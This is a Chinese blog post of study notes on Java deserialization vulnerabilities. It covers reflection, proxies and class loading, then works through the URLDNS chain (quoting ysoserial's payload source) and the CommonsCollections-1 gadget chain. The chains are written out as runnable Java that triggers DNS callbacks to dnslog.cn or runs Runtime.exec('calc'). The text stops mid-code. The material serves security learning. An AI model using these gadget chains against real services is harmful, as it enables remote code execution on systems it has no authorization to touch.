+++
date = '2025-07-28T17:28:43+08:00'
draft = false
title = 'Java反序列化学习'
categories = ['Web', 'Java']
tags = ['Web', 'Study', 'Java']

+++

## Java 反序列化基础
```TEXT
共同条件 继承Serializable
入口类 source（重写readObject 调用常见的函数 参数类型宽泛 最好jdk自带）
调用链 gadget chain 相同名称 相同类型
执行类 sink （rce ssrf 写文件等等）最重要!!!
```

<!--more-->

可能形式：    
1、入口类的 readObject 直接调用危险方法。    
2、入口类参数中包含可控类，该类里面有危险方法，readObject 时调用。    
3、入口类参数中包含可控类，该类又调用有其他有危险方法的类，readObject 时调用。    
### 原理
- `readObject()` 是一个特殊的钩子函数，在对象序列化时会自动调用。    
- 它允许开发者自定义反序列化的行为，比如执行初始化代码、数据校验，甚至执行系统命令。    
- 在反序列化过程中，Java 会自动检查是否有 `readObject()` 方法，如果存在，系统会自动调用它。    
- `Runtime.getRuntime().exec("calc")` 这样的恶意代码会在反序列化时执行，这就是反序列化漏洞的经典利用方式。    
### 大致思路
- 找危险方法调用（不同类的同名函数任意方法调用）
	- 原理：例如 `xxx.hashcode()` 只要我们能控制 `xxx`，那么就能在某个类启用中调用其他类的 `hashcode()`，从而实现我们的目标。    
- 再找接收任意对象执行的方法
### 准备阶段
- jdk-8u65
- Openjdk 源码下载
- Maven 依赖 3.2.1
### Java 反序列化底层原理示例
#### 示例代码 (Person.java)
```Java
import java.io.Serializable;  
  
public class Person implements Serializable{  
    // 私有变量，表示了Person的属性  
    private String name;  // 在后面的“获取类里面的属性”演示中需要改为public
    private int age;  
  
    // 无参构造函数，当不传递参数时使用  
    public Person() {System.out.println("无参Person");}  
  
    // 带参数的构造函数，用于初始化Person对象时传递name和age  
    public Person(String name, int age) {  
        this.name = name;  
        this.age = age;  
    }  
  
    // 重写了toString方法，用于返回Person对象的字符串表示  
    @Override  
    public String toString() {  
        return "Person{" +  
                "name='" + name + '\'' +  
                ",age=" + age +  
                '}';  
    }  
    
    // 重写了readObject方法，并且在里面添加了命令执行
    /*
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {  
    ois.defaultReadObject();  
    Runtime.getRuntime().exec("calc");  
    */
	}
}
```
>当变量前有 `transient` 标志时，该变量就不会传递过去，即不参与序列化
#### 示例代码 (SerTest.java)
```Java
import java.io.*;  
import java.net.HttpURLConnection;  
import java.net.URL;  
import java.util.HashMap;  
import java.util.Map;  
  
public class SerTest {  
    // 创建一个序列化对象的方法（函数）  
    public static void serialize(Object obj) throws IOException {  
        // 创建了一个ObjectOutputStream对象，并将对象写入到指定的文件输出流。用FileOutputStream来指定文件路径  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("F:\\Code\\Java Project\\unserializable\\ser.bin"));  
        // 将传入的对象obj写入到输出流中，实现序列化操作  
        oos.writeObject(obj);  
    }  
    public static void main(String[] args) throws Exception {  
        Person person = new Person("aa",22);  
        // System.out.println(person);  
        serialize(person);  
    }  
}
```
#### 示例代码 (UnserTest.java)
```Java
import java.io.FileInputStream;  
import java.io.IOException;  
import java.io.ObjectInputStream;  
  
public class UnserTest {  
    // 定义一个方法，用于从文件读取对象并且返回对象
    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {  
    	// ObjectInputStream 是一个用于从字节流中读取对象的类  
    	// FileInputStream 打开了之前保存的文件 (ser.bin)，以便从中读取对象  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));  
        Object obj = ois.readObject();  
        return obj;  
    }  
  
    public static void main(String[] args) throws Exception {  
        // 反序列化读取，并强制转换成Person的类型
        Person person = (Person) unserialize("F:\\Code\\Java Project\\unserializable\\ser.bin");  
        // 调用Person类中的toString方法
        System.out.println(person);  
    }  
}
```
#### 入口类范例 (HashMap.java)
```Java
Map<Object,Object>; // Map类可以序列化，且参数类型宽泛
```
- 而 HashMap 类重写了 `readObject()`，符合入口类的要求。

![](../assets/屏幕截图%202024-11-02%20002314.png)

- 留意到最后调用了 `hash()` 函数，然后我们继续跟进。
```Java
static final int hash(Object key) {  
    int h;  
    // 定义了“Object key”不为空的话，就会调用key的hashcode()方法
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);  
}
```
- 继续跟进到 Object 函数中，看到有 `hashcode()` 函数。

![](../assets/屏幕截图%202024-11-02%20225056.png)

>在后续找利用链的时候，你重写了 `toString()` 之类的这些方法，并且这些方法里有潜在的危险方法，并且这个链还可以序列化、反序列化，那么这个就有可能是利用链上会出现的类
### Java 反射
#### 正射
- 在编译期就确定了要调用的方法和对象，是一种直接的、静态的调用方式。例如，你明确知道要调用一个对象的某个方法，直接使用对象名和方法名进行调用。
#### 反射
- 在运行时动态地确定要操作的类、方法或字段。可以根据不同的条件在运行时决定调用哪个方法，操作哪个字段等，让 Java 具有动态性。
#### 例子
```Java
// Reflection.java
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class ReflectionTest {
    public static void main(String[] args) throws Exception {
        Person person = new Person();
        Class c = person.getClass(); // 得到了一个大写Class对象

        // 反射就是操作Class
        // Class c = person.getClass();

        // 从原型class中实例化对象
        // c.newInstance(); // 不能传参数，只能调用无参的方法
        Constructor personconstructor = c.getConstructor(String.class,int.class);
        Person p = (Person) personconstructor.newInstance("abc", 22);
        System.out.println(p);

        // 获取类里面的属性
        Field[] personfields = c.getDeclaredFields(); // 获取该类的全部属性，getFields()只能打印public变量
        for (Field f:personfields) {
            System.out.println(f);
        }
        // Field namefield = c.getField("name"); // 获取public变量
        // namefield.set(p,"def");
        Field namefield = c.getDeclaredField("age");
        namefield.setAccessible(true); // 在改变private变量时，需要使用setAccessible(true)来允许访问namefield
        namefield.set(p,25); // set(Object obj,Object value)
        System.out.println(p);

        // 调用类里面的方法
        Method[] personmethods = c.getMethods(); // 获取该类中的全部方法
        for (Method m:personmethods) {
            System.out.println(m);
        }
        
        // Method actionmethod = c.getMethod("action",String.class); // 调用public方法，getMethod(String name,Class<?>,...parameterTypes)
        // actionmethod.invoke(p,"success"); // invoke(Object obj,Object args)
        
        Method actionmethod_2 = c.getDeclaredMethod("action",String.class); // 调用private方法
        actionmethod_2.setAccessible(true);
        actionmethod_2.invoke(p,"success");
    }
}
```
- 跟进 `getClass()` 方法，发现这个是 `Object.java` 中的一个方法。
```Java
// 执行getClass()会返回一个大Class类，是一个泛型
public final native Class<?> getClass();
```
- 继续跟进 `Class<?>`，这里将传入名字转化成原型类并返回。

![](../assets/屏幕截图%202024-11-02%20233353.png)

- 跟进后面的 `newInstance()`，看到这是一个无参的方法。    
- 而我们想要调用有参的方法，就要用到 `getConstructor()`，下面跟进一下。

![](../assets/屏幕截图%202024-11-03%20000000.png)

>这个 `getConstructor()` 方法是可以接受参数的，它获取这个类里的构造方法，然后传入不同的参数，就会调用不同的构造方法
- 接着看从类获取属性，总共有以下几种获取方法。

![](../assets/屏幕截图%202024-11-03%20000929.png)

>这几种获取方法用法见上示例代码
#### 反射在反序列化中的应用
- 定制所需要的对象    
- 通过 invoke 调用除了同名函数以外的函数    
- 通过 Class 对象创建类，引入不能序列化的类    
### JDK 静态&动态代理
- 示例代码（ProxyTest.java）
```Java
import java.lang.reflect.InvocationHandler;  
import java.lang.reflect.Proxy;  
  
public class ProxyTest {  
    public static void main(String[] args) {  
        IUser user = new UserImpl();  
        user.show();  
        // 静态代理  
        // IUser userProxy = new UserProxy(user);  
        // userProxy.show();  
        // 动态代理  
        // 要代理的接口、要做的事情、classloader  
        InvocationHandler userInvocationHandler = new UserInvocationHandler(user);  
        IUser userProxy = (IUser) Proxy.newProxyInstance(user.getClass().getClassLoader(),  
                new Class<?>[]{IUser.class},// user.getClass().getInterfaces(),  
                userInvocationHandler);  
        userProxy.create();  
    }  
}
```
- 示例代码（IUser.java）
```Java
// 接口类
public interface IUser {  
    void show();  
    void create();  
    void update();  
}
```
- 示例代码（UserImpl.java）
```Java
// 接口类接口的实现方法
public class UserImpl implements IUser{  
    public UserImpl(){  
  
    }  
  
    @Override  
    public void show(){  
        System.out.println("展示");  
    }  
  
    @Override  
    public void create() {  
        System.out.println("创建");  
    }  
  
    @Override  
    public void update() {  
        System.out.println("更新");  
    }  
}
```
- 示例代码（UserProxy.java）
```Java
// 静态代理才需要的代码
public class UserProxy implements IUser{  
    IUser user;  
    public UserProxy() {  
  
    }  
  
    public UserProxy(IUser user) {this.user = user;}  
  
    @Override  
    public void show(){  
        System.out.println("调用了show");  
    }  
  
    @Override  
    public void create() {  
        System.out.println("调用了create");  
    }  
  
    @Override  
    public void update() {  
        System.out.println("调用了update");  
    }  
}
```
- 示例代码（UserInvocationHandler.java）
```Java
// 动态代理的实现代码
import java.lang.reflect.InvocationHandler;  
import java.lang.reflect.Method;  
  
public class UserInvocationHandler implements InvocationHandler {  
    IUser user;  
    public UserInvocationHandler() {  
  
    }  
  
    public UserInvocationHandler(IUser user) {  
        this.user = user;  
    }  
  
    @Override  
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {  
        System.out.println("调用了"+method.getName());  
        method.invoke(user, args); // 捕捉到参数当作method传入，对着代理的对象user，然后调用这个方法  
        return null;  
    }  
}
```
#### 动态代理的优点
- 不修改原有类，增加功能；    
- 少代码，适配性更强；    
- readObject -> 反序列化自动调用，invoke -> 有函数调用；    
- 在反序列化中可以将两条链粘到一起，可以巧妙地避开难以构造调用链的情景，即任意->固定。    
### 类的动态加载
- 在 `Person.java` 中添加下列代码。
```Java
public static int id;  
static {  
    System.out.println("静态代码块");  // 当Java初始化时就会调用到静态代码块
}  
  
public static void staticAction(){  
    System.out.println("静态方法");  
}
// 修改此部分代码至如下
public Person(String name, int age) {  
    System.out.println("有参Person");  
    this.name = name;  
    this.age = age;  
}
```
#### 类的加载过程
```TEXT
加载 -> 验证 -> 准备 -> 解析 -> 初始化 -> 使用 -> 卸载
       |_______连接_______|
```
#### 示例代码（LoadClassTest.java）
```Java
import sun.misc.Unsafe;  
  
import java.io.File;  
import java.io.FileOutputStream;  
import java.lang.reflect.Field;  
import java.lang.reflect.Method;  
import java.net.URL;  
import java.net.URLClassLoader;  
import java.nio.file.Files;  
import java.nio.file.Path;  
import java.nio.file.Paths;  
  
public class LoadClassTest {  
    public static void main(String[] args) throws Exception {  
  
//        new Person("aa",22);  
//        Person.staticAction(); // 调用静态方法staticAction()  
//        Person.id = 1;  // 测试是否调用静态代码块  
//        Class c = Person.class;  
//        Class.forName("Person"); // 调用了静态代码块  
        ClassLoader cl = ClassLoader.getSystemClassLoader(); // ClassLoader是抽象类，不能实例化  
//        Class<?> c = Class.forName("Person",false,cl); // 第二个参数传false，使其不初始化  
//        c.newInstance();  
//        System.out.println(cl);  
//        Class<?> c = cl.loadClass("Person"); // 不进行初始化  
//        c.newInstance();  
        // URLClassLoader允许从指定的 URL 路径加载类文件  
        // URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL("file:///F:\\Code\\Java Project\\unserializable\\target\\classes\\")});  
        // 还可以用jar:file:///F:\\Code\\Java Project\\unserializable\\target\\classes\\hello.jar!/  
//        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL("http://localhost:9999/")});  
        // 使用创建的URLClassLoader对象加载名为 “hello” 的类  
//        Class<?> c = urlClassLoader.loadClass("hello");  
        // 通过反射机制创建 “hello” 类的一个实例，通过无参构造函数来调用对象  
//        c.newInstance();  
//        Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass",String.class,byte[].class,int.class,int.class);  
//        defineClassMethod.setAccessible(true);  
//        // 将文件读取成为字节数组，并返回  
        byte[] code = Files.readAllBytes(Paths.get("F:\\Code\\Java Project\\unserializable\\target\\classes\\hello.class"));  
//        Class c = (Class) defineClassMethod.invoke(cl,"hello",code,0,code.length);  
//        c.newInstance();  
  
//        Unsafe unsafe = Unsafe.getUnsafe();  
        Class c = Unsafe.class;  
        Field theUnsafeField = c.getDeclaredField("theUnsafe");  
        theUnsafeField.setAccessible(true);  
        Unsafe unsafe = (Unsafe) theUnsafeField.get(null);  
        Class c2 = (Class) unsafe.defineClass("hello",code,0,code.length,cl,null);  
        c2.newInstance();  
    }  
}
```
- 发现 `Class.forName("Person");` 调用了静态代码块，我们跟进 `forname()` 方法，看到最后调用了 `forName0()`。
```Java
@CallerSensitive  
public static Class<?> forName(String className)  
            throws ClassNotFoundException {  
    Class<?> caller = Reflection.getCallerClass();  
    return forName0(className, true, ClassLoader.getClassLoader(caller), caller);  
}
```
- 继续跟进，`native` 表示这个方法使用 C/C++ 写的，`initialize` 判断有无初始化。

![](../assets/屏幕截图%202024-11-03%20200724.png)

- 我们在往上找，看到 `forName` 第二个参数传的是 `true`，所以 `forName()` 默认初始化。

![](../assets/屏幕截图%202024-11-03%20201101.png)

- 所以只要对第二个参数传 false 即可不初始化。
```Java
// LoadClassTest.java
ClassLoader cl = ClassLoader.getSystemClassLoader(); // ClassLoader是抽象类，不能实例化  
Class<?> c = Class.forName("Person",false,cl); // 第二个参数传false，使其不初始化  
c.newInstance();
```
- 如果我们能实现加载任意的类，那我们就有特别大的攻击面。    
- 调试暂时省略...... （看不懂）    
- 下面是加载任意类的底层原理：    
```TEXT
ClassLoader -> SecureClassLoader -> URLClassLoader -> AppClassLoader
loadClass -> findClass（重写的方法） -> defineClass（从字节码加载类）
```
#### 测试&利用（hello.java）
```Java
import java.io.IOException;  
  
public class hello {  
    static {  
        try{  
            Runtime.getRuntime().exec("calc");  
        } catch(IOException e){  
            e.printStackTrace();  
        }  
  
    }  
    public static void main(String[] args) {  
        System.out.println("hello");  
    }  
}
```
- 我们尝试通过 `URLClassLoader` 去加载类。
```Java
// LoadClassTest.java
// URLClassLoader允许从指定的 URL 路径加载类文件  
// URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL("file:///F:\\Code\\Java Project\\unserializable\\target\\classes\\")});  
// 还可以用jar:file:///F:\\Code\\Java Project\\unserializable\\target\\classes\\hello.jar!/
URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL("http://localhost:9999/")});  
// 使用创建的URLClassLoader对象加载名为 “hello” 的类  
Class<?> c = urlClassLoader.loadClass("hello");  
// 通过反射机制创建 “hello” 类的一个实例，通过无参构造函数来调用对象  
c.newInstance();
```
> `URLClassLoader` 任意类加载方法：file / http / jar
- 下面是 `defineClass` 来加载类。
```Java
// LoadClassTest.java
ClassLoader cl = ClassLoader.getSystemClassLoader();  
// 反射调用
Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass",String.class,byte[].class,int.class,int.class);  
defineClassMethod.setAccessible(true);  
// 将文件读取成为字节数组，并返回
byte[] code = Files.readAllBytes(Paths.get("F:\\Code\\Java Project\\unserializable\\target\\classes\\hello.class"));  
Class c = (Class) defineClassMethod.invoke(cl,"hello",code,0,code.length);  
c.newInstance();
```
- 调用 `Unsafe.java` 中的 `defineClass()` 方法来加载任意类。    
- 又因为它有安全检查，不能直接获取它的对象。 

![](../assets/屏幕截图%202024-11-03%20213254.png)

- 我们就要反射调用这个 `theUnsafe` 属性来调用对象。   
```Java
// LoadClassTest.java
ClassLoader cl = ClassLoader.getSystemClassLoader();  
byte[] code = Files.readAllBytes(Paths.get("F:\\Code\\Java Project\\unserializable\\target\\classes\\hello.class"));  
// 反射调用
Class c = Unsafe.class;  
Field theUnsafeField = c.getDeclaredField("theUnsafe");  
theUnsafeField.setAccessible(true);  
Unsafe unsafe = (Unsafe) theUnsafeField.get(null);  
Class c2 = (Class) unsafe.defineClass("hello",code,0,code.length,cl,null);  
c2.newInstance();
```
#### 总结
```TEXT
URLClassLoader 任意类加载方法：file / http / jar
ClassLoader.defineClass 字节码加载任意类 私有
Unsafe.defineClass 字节码加载 public类不能直接生成 Spring里面可以直接生成
```

## URLDNS 链
- 我们可以参考 [ysoserial](https://github.com/frohoff/ysoserial/tree/master/src/main/java/ysoserial/payloads) 里面的 URLDNS 利用脚本。
```Java
package ysoserial.payloads;

import java.io.IOException;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.URL;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;


/**
 * A blog post with more details about this gadget chain is at the url below:
 *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/
 *
 *   This was inspired by  Philippe Arteau @h3xstream, who wrote a blog
 *   posting describing how he modified the Java Commons Collections gadget
 *   in ysoserial to open a URL. This takes the same idea, but eliminates
 *   the dependency on Commons Collections and does a DNS lookup with just
 *   standard JDK classes.
 *
 *   The Java URL class has an interesting property on its equals and
 *   hashCode methods. The URL class will, as a side effect, do a DNS lookup
 *   during a comparison (either equals or hashCode).
 *
 *   As part of deserialization, HashMap calls hashCode on each key that it
 *   deserializes, so using a Java URL object as a serialized key allows
 *   it to trigger a DNS lookup.
 *
 *   Gadget Chain:
 *     HashMap.readObject()
 *       HashMap.putVal()
 *         HashMap.hash()
 *           URL.hashCode()
 *
 *
 */
@SuppressWarnings({ "rawtypes", "unchecked" })
@PayloadTest(skip = "true")
@Dependencies()
@Authors({ Authors.GEBL })
public class URLDNS implements ObjectPayload<Object> {

        public Object getObject(final String url) throws Exception {

                //Avoid DNS resolution during payload creation
                //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
                URLStreamHandler handler = new SilentURLStreamHandler();

                HashMap ht = new HashMap(); // HashMap that will contain the URL
                URL u = new URL(null, url, handler); // URL to use as the Key
                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

                Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.

                return ht;
        }

        public static void main(final String[] args) throws Exception {
                PayloadRunner.run(URLDNS.class, args);
        }

        /**
         * <p>This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
         * using the serialized object.</p>
         *
         * <b>Potential false negative:</b>
         * <p>If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
         * second resolution.</p>
         */
        static class SilentURLStreamHandler extends URLStreamHandler {

                protected URLConnection openConnection(URL u) throws IOException {
                        return null;
                }

                protected synchronized InetAddress getHostAddress(URL u) {
                        return null;
                }
        }
}
```
- 我们首先去看 `URL.java`，正常的写法就是 `openConnection()`, 在跟进到 `URLConnection()`，发现它是一个抽象类，实现方法一般是 `HTTPURLConnection()`，而且很难找到同名方法（函数）来进行替换，所以这个是不可行的。  
- 那么我们就去找最常见的函数，这里找到 `hashcode()`。  

![](../assets/屏幕截图%202024-11-03%20104308.png)

- 我们看到它调用了 `handler` 的 `hashcode()`，我们继续跟进。  

![](../assets/屏幕截图%202024-11-03%20105323.png)

>如果利用链能通的话，这里的 `getHostAddress()` 就会发起 DNS 请求，然后就可以验证是否存在漏洞  
### 入口类（HashMap 类）
- 我们回到上面说的 HashMap 类中，它的 `readObject()` 调用了 `hash()` 方法，跟进看到 `hash()` 方法又调用了 `hashcode()`，那么正常就能走到 `URL` 类的 `hashcode()` 中。  
```Java
static final int hash(Object key) {  
    int h;  
    // 定义了“Object key”不为空的话，就会调用key的hashcode()方法
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);  
}
```
### 问题
- 尝试利用，发现 `put()` 也会调用 `hashcode()` 从而造成误判。
```Java
import java.io.*;  
import java.net.HttpURLConnection;  
import java.net.URL;  
import java.util.HashMap;  
import java.util.Map;  
  
public class SerTest {  
    // 创建一个序列化对象的方法（函数）  
    public static void serialize(Object obj) throws IOException {  
        // 创建了一个ObjectOutputStream对象，并将对象写入到指定的文件输出流。用FileOutputStream来指定文件路径  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("F:\\Code\\Java Project\\unserializable\\ser.bin"));  
        // 将传入的对象obj写入到输出流中，实现序列化操作  
        oos.writeObject(obj);  
    }  
    public static void main(String[] args) throws Exception {  
        HashMap<URL,Integer> hashmap = new HashMap<URL,Integer>();   
        hashmap.put(new URL("http://ha41ea.dnslog.cn"),1); // 实际上这里调用put()时，已经会调用hashcode()就造成“误判”  
        serialize(hashmap);  
    }  
}
```
### 构造链
- 那么，我们要使用反射对方法中的值进行修改，使它在序列化的时候不发起域名解析请求。  
```Java
// 修改后
import java.io.*;  
import java.net.URL;  
import java.util.HashMap;    
import java.lang.reflect.Field;  
  
public class SerTest {  
    // 创建一个序列化对象的方法（函数）  
    public static void serialize(Object obj) throws IOException {  
        // 创建了一个ObjectOutputStream对象，并将对象写入到指定的文件输出流。用FileOutputStream来指定文件路径  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("F:\\Code\\Java Project\\unserializable\\ser.bin"));  
        // 将传入的对象obj写入到输出流中，实现序列化操作  
        oos.writeObject(obj);  
    }  
    public static void main(String[] args) throws Exception {  
        HashMap<URL,Integer> hashmap = new HashMap<URL,Integer>();  
        // 这里不要发起请求  
        URL url = new URL("http://umtd5s.dnslog.cn");  
        Class c = url.getClass();  
        Field hashcodefield = c.getDeclaredField("hashCode");  
        hashcodefield.setAccessible(true);  
        hashcodefield.set(url,1234);  
        hashmap.put(url,1);  
        // 这里把hashcode改回-1  
        // 通过反射改变已有属性的值  
        hashcodefield.set(url,-1);  
        serialize(hashmap);  
    }  
}
```
### 反序列化调用
```Java
import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;

public class UnserTest {
    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        return obj;
    }

    public static void main(String[] args) throws Exception {
        unserialize("F:\\Code\\Java Project\\unserializable\\ser.bin");
    }
}
```
## CommonsCollections-1 链
### 准备
在 pom.xml 添加下列内容
```TEXT
<dependencies>  
    <!-- https://mvnrepository.com/artifact/commons-collections/commons-collections -->  
    <dependency>  
        <groupId>commons-collections</groupId>  
        <artifactId>commons-collections</artifactId>  
        <version>3.2.1</version>  
    </dependency>
</dependencies>
```
### 漏洞点
```Java
// InvokerTransformer方法接受的参数类型宽泛，且传递的参数类型和参数都能由我们控制
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {  
    super();  
    iMethodName = methodName;  
    iParamTypes = paramTypes;  
    iArgs = args;  
}

// 接受一个类
public Object transform(Object input) {  
    if (input == null) {  
        return null;  
    }  
    try {  
        // 从输入中获取类
        Class cls = input.getClass();  
        // 从输入中获取方法和方法参数类型数组
        Method method = cls.getMethod(iMethodName, iParamTypes);  
        // 调用获取到的方法，并传入输入对象和方法参数
        return method.invoke(input, iArgs);  
              
    } catch (NoSuchMethodException ex) {  
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");  
    } catch (IllegalAccessException ex) {  
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");  
    } catch (InvocationTargetException ex) {  
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);  
    }  
}
```
- 这里接受传入参数，可以指定方法值和参数类型，是标准的任意方法调用。    
### 学习代码
```Java
package org.example;  
  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
  
import java.io.*;  
import java.lang.annotation.Target;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.Method;  
import java.util.HashMap;  
import java.util.Map;  
  
public class CC1Test {  
    public static void main(String[] args) throws Exception {  
  
//        Runtime r = Runtime.getRuntime();  
//  
//        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});  
//        // invokerTransformer.transform(r);  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),  
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),  
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
//        chainedTransformer.transform(Runtime.class);  
//        valueTransformer.transform(value); 跟上句相同  
  
        HashMap<Object,Object> map = new HashMap<>();  
        map.put("value","aaa");  
        Map<Object,Object> tranformedMap = TransformedMap.decorate(map,null,chainedTransformer);  
  
//        Method getRuntimeMethod = (Method) new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}).transform(Runtime.class);  
//        Runtime r  = (Runtime) new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getRuntimeMethod);  
//        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(r);  
  
//        Class c = Runtime.class;  
//        Method getRuntimeMethod = c.getMethod("getRuntime",null);  
//        Runtime r = (Runtime) getRuntimeMethod.invoke(null,null);  
//        Method execMethod = c.getMethod("exec",String.class);  
//        execMethod.invoke(r,"calc");  
  
//        for (Map.Entry entry : tranformedMap.entrySet()) {  
//            entry.setValue(r);  
//        }  
  
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
        Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class);  
        annotationInvocationHandlerConstructor.setAccessible(true);  
        Object o = annotationInvocationHandlerConstructor.newInstance(Target.class,tranformedMap);  
        serialize(o);  
        unserialize("F:\\Code\\Java Project\\CCTest\\src\\main\\java\\org\\example\\ser.bin");  
    }  
  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("F:\\Code\\Java Project\\CCTest\\src\\main\\java\\org\\example\\ser.bin"));  
        oos.writeObject(obj);  
    }  
  
    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));  
        Object obj = ois.readObject();  
        return obj;  
    }  
}
```
### 调试
- 正常的命令执行。
```Java
public class Main {  
    public static void main(String[] args) throws Exception {    
        Runtime.getRuntime().exec("calc");  
    }  
}
```
- 反射调用。
```Java
public class Main {  
    public static void main(String[] args) throws Exception {      
		Runtime r = Runtime.getRuntime();  
		Class c = Runtime.class;  
		Method execMethod = c.getMethod("exec", String.class);  
		execMethod.invoke(r, "calc"); 
    }  
}
```
- 通过跟进 `InvokerTransformer`，可以了解到用法。  

![](../assets/屏幕截图%202024-11-03%20221456.png)

- 通过危险方法的调用。
```Java
public class Main {  
    public static void main(String[] args) throws Exception {      
		Runtime r = Runtime.getRuntime();  
		new InvokerTransformer("exec",new Class[]{String.class},new object[]{"calc"}).transform(r);
    }  
}
```
- Ctrl + Alt + H 来查看谁调用了 `transform()`。    

![](../assets/屏幕截图%202024-11-03%20223525.png)

- 接着找到 `TransformedMap` 中的 `valueTransformer`。    

![](../assets/屏幕截图%202024-11-03%20223855.png)

- 想要调用它需要用 `decorate` 来构造它。    

![](../assets/屏幕截图%202024-11-03%20224046.png)

- 而想要去到 `valueTransformer`，就要先调用 `checkSetValue`，而这里的抽象类中的 `setValue()` 方法就调用了 `checkSetValue` 方法。    

![](../assets/屏幕截图%202024-11-03%20224519.png)

- 再次尝试。    
```Java
package org.example;  
  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
  
import java.io.*;  
import java.util.HashMap;  
import java.util.Map;  
  
public class CC1Test {  
    public static void main(String[] args) throws Exception {  
  
        Runtime r = Runtime.getRuntime();  
  
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});  
        // invokerTransformer.transform(r);  
        HashMap<Object,Object> map = new HashMap<>();  
        map.put("key","value");  
        Map<Object,Object> tranformedMap = TransformedMap.decorate(map,null,invokerTransformer);  
  
        for (Map.Entry entry : tranformedMap.entrySet()) {  
            entry.setValue(r);  
        }  
    }  
}
```
>调试成功，这条链是可以使用的    
- 然后我们需要继续找到调用 `setValue()` 的 `readObject()` 方法，我们找到 `AnnotationInvocationHandler`，发现这里的代码完全可以替代上述的循环遍历。    

![](../assets/屏幕截图%202024-11-03%20231523.png)

- 去看看能不能控制参数传入，发现可以构造传入，这个类不是 public，所以要反射获取类。    

![](../assets/屏幕截图%202024-11-03%20232316.png)

### 目前的问题
1、`Runtime r = Runtime.getRuntime();` 不能序列化；    
2、他的 `setValue` 的对象已经确定，没法直接改；    
3、还要过 if 判断。    
- 解决方法 1
```Java
// 反射调用，使其可以反序列化
        Class c = Runtime.class;  
        Method getRuntimeMethod = c.getMethod("getRuntime",null);  
        Runtime r = (Runtime) getRuntimeMethod.invoke(null,null);  
        Method execMethod = c.getMethod("exec",String.class);  
        execMethod.invoke(r,"calc");
        
// 在执行类中的实现方式
Method getRuntimeMethod = (Method) new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}).transform(Runtime.class);  
Runtime r  = (Runtime) new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getRuntimeMethod);  
new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(r);

// 利用ChainedTransformer来简化代码
Transformer[] transformers = new Transformer[]{  
        new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),  
        new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),  
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})  
};  
